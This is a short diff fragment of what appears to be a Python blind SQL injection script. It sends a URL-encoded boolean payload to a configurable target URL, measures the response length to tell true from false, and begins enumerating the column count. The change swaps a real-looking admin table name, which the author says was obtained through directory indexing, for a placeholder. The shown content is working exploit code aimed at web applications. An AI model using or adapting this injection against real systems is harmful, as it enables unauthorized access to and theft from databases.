@@ -9,7 +9,7 @@ import requests
 DEFAULT_URL="http://127.0.0.1/" #Insert your target url
 TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
 #TRUE_RES==different html length
-KNOWN_TABLE_NAME="hm_admin_db" #I got a admin table name to use file download and directory Indexing. LOL
+KNOWN_TABLE_NAME="tb" #input table name
 
 def get_columns_num():
     for i in range(1,21):
